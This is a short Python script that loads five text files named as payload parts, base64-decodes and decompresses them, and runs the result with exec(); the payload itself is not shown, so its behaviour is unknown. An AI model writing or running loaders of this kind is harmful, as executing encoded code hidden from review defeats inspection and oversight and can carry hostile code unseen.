from __future__ import annotations

import base64
import gzip
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
PAYLOAD = ''.join(
    (ROOT / f'scripts/t052_payload_{index:02d}.txt').read_text(encoding='utf-8').strip()
    for index in range(5)
)
SOURCE = gzip.decompress(base64.b64decode(PAYLOAD))
exec(compile(SOURCE, __file__, 'exec'))
